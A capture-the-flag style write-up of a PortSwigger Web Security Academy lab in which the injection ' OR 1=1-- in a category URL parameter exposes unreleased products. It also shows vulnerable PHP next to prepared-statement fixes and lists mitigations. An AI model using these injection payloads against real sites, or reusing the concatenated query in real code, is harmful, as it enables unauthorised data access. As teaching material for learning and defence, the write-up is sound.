# PortSwigger — SQL Injection in WHERE Clause (Hidden Data Retrieval)

`Web Security Academy` • `SQL Injection` • `Apprentice`

## TL;DR

A product category filter passes user input directly into a SQL query with no sanitization. Injecting `' OR 1=1--` into the `category` parameter comments out the `released = 1` filter and returns all products, including hidden unreleased ones.

**Lab URL:** `https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
>
> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
>
> To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

**Context:**
- Difficulty: **Apprentice**
- Category: **SQL Injection**
- Goal: Make unreleased products visible by bypassing the `released = 1` filter

---

## Recon

### Step 1 — Understand the application flow

Browsing the web application, we see a product listing page with category filters:

```
https://<lab-id>.web-security-academy.net/filter?category=Gifts
```

When a category is selected, the app queries the database using the `category` GET parameter directly. The backend SQL query is:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Key observations:**
- The `category` parameter is **reflected directly** in the SQL query — no sanitization visible
- The `released = 1` clause hides unreleased products from regular users
- The category value is wrapped in **single quotes** in the query → classic string injection point

### Step 2 — Confirm the injection point

Appending a single quote `'` to the category value:

```
/filter?category=Gifts'
```

Results in a **500 Internal Server Error** — the query breaks because the quote is unescaped. This confirms the parameter is injectable.

---

## Exploitation

### Step 3 — Craft the payload

The goal is to:
1. Break out of the string context with `'`
2. Add a condition that is **always true** with `OR 1=1`
3. Comment out the rest of the query (including `AND released = 1`) with `--`

**Payload:**
```
' OR 1=1--
```

**Final URL:**
```
https://<lab-id>.web-security-academy.net/filter?category='+OR+1=1--
```

### Step 4 — Analyze what happens server-side

The injected query becomes:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

Breaking it down:

| Fragment | Role |
|---|---|
| `category = ''` | Closes the original string — matches nothing |
| `OR 1=1` | Always evaluates to `TRUE` → matches **every row** |
| `--` | SQL comment — neutralizes `AND released = 1` entirely |
| `' AND released = 1` | Dead code, never executed |

The `WHERE` clause now returns **all rows** from the `products` table regardless of their `released` status.

### Step 5 — Execute and solve

Navigate to:
```
https://<lab-id>.web-security-academy.net/filter?category='+OR+1=1--
```

The page now displays **all products**, including those with `released = 0`. The lab banner confirms:

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
Browse the app → /filter?category=Gifts
        ↓
Identify GET parameter injected into SQL query
        ↓
Test with ' → 500 error → injection confirmed
        ↓
Payload: ' OR 1=1--
        ↓
Query: WHERE category = '' OR 1=1--' AND released = 1
        ↓
OR 1=1 → all rows returned
-- → released = 1 filter neutralized
        ↓
Unreleased products visible → LAB SOLVED ✅
```

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Reference |
|---|---|
| **CWE-89** | Improper Neutralization of Special Elements used in a SQL Command |
| **OWASP A03:2021** | Injection |
| **CVSSv3** | 9.8 Critical (network-accessible, no auth required, full data exposure) |

**Why this is critical:**

- An attacker can bypass **business logic** (visibility rules, access control based on column values)
- Extending the payload beyond `OR 1=1` allows **full database enumeration**: tables, columns, other users' data
- If the DB user has write permissions: **data modification or deletion** is possible
- In severe cases: **OS command execution** via functions like `xp_cmdshell` (MSSQL)

**Real-world attack scenarios:**
1. **Data exfiltration**: Dump all user records, passwords, PII
2. **Authentication bypass**: `WHERE username='admin'--` skips password check entirely
3. **Privilege escalation**: Read config tables to extract admin credentials
4. **Second-order injection**: Store a payload that fires later in a different query

---

### Secure Code Fix

**❌ Vulnerable code (PHP example):**
```php
$category = $_GET['category'];
$query = "SELECT * FROM products WHERE category = '$category' AND released = 1";
$result = $db->query($query);
```

**✅ Fixed with Prepared Statements:**
```php
$stmt = $db->prepare("SELECT * FROM products WHERE category = ? AND released = 1");
$stmt->bind_param("s", $_GET['category']);
$stmt->execute();
$result = $stmt->get_result();
```

**✅ Fixed with Parameterized Query (PDO):**
```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = :category AND released = 1");
$stmt->execute([':category' => $_GET['category']]);
```

**Best Practices:**
1. **Always use prepared statements / parameterized queries** — never concatenate user input into SQL
2. **Apply the Principle of Least Privilege** — the DB account used by the app should have read-only access to only the tables it needs
3. **Input validation** — whitelist expected values (especially for enum-like parameters such as category names)
4. **WAF as a secondary layer** — not a replacement for secure code, but useful to catch common payloads in transit
5. **Error handling** — never expose raw SQL errors to the user; log internally only

---

## Key Takeaways

**Technical Skills:**
- Identified a string-based SQL injection via a GET parameter
- Confirmed the injection by triggering a syntax error with `'`
- Constructed a `OR 1=1--` payload to bypass a `WHERE` filter
- Understood how SQL comments (`--`) truncate the rest of a query

**Security Concepts:**
- SQL injection remains the **#1 most exploited web vulnerability** in real breaches
- Business logic enforced at the SQL query level (like `released = 1`) provides **zero security** if the query itself is injectable
- Parameterized queries are the **only reliable fix** — input sanitization alone is insufficient and bypassable

---

## References

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP Top 10 2021 — A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)